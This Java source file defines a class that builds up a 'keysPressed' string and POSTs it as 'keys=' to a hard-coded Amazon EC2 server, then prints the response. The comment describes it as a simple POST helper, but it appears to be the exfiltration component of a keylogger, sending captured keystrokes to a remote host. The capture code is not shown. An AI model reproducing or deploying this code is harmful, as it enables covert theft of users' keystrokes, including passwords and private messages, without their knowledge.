package com.company;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.ProtocolException;
import java.net.URL;
import java.nio.charset.StandardCharsets;

/*
 * This class only:
 * 1.Takes parameter String to be sent in POST
 * 2.Sends data to address given in url
*/

public class JavaPostRequest {

    private static HttpURLConnection con;
    public static String urlParameters = "keys=";

    public static void Connect() throws MalformedURLException,
            ProtocolException, IOException {

        String url = "http://ec2-54-158-71-64.compute-1.amazonaws.com/test.php";

        byte[] postData = urlParameters.getBytes(StandardCharsets.UTF_8);
        urlParameters = "keys="; //Reset parameters

        try {

            URL myurl = new URL(url);
            con = (HttpURLConnection) myurl.openConnection();

            con.setDoOutput(true);
            con.setRequestMethod("POST");
            con.setRequestProperty("User-Agent", "Java client");
            con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

            //Send POST
            try (DataOutputStream wr = new DataOutputStream(con.getOutputStream())) {
                wr.write(postData);
            }

            //Print server response
            StringBuilder content;
            try (BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()))) {
                String line;
                content = new StringBuilder();
                while ((line = in.readLine()) != null) {
                    content.append(line);
                    content.append(System.lineSeparator());
                }
            }
            System.out.println(content.toString());

        } finally {
            con.disconnect();
        }
    }

    //Set String to be send in POST
    public static void setParameters(String keysPressed) {
        urlParameters += keysPressed;
    }
}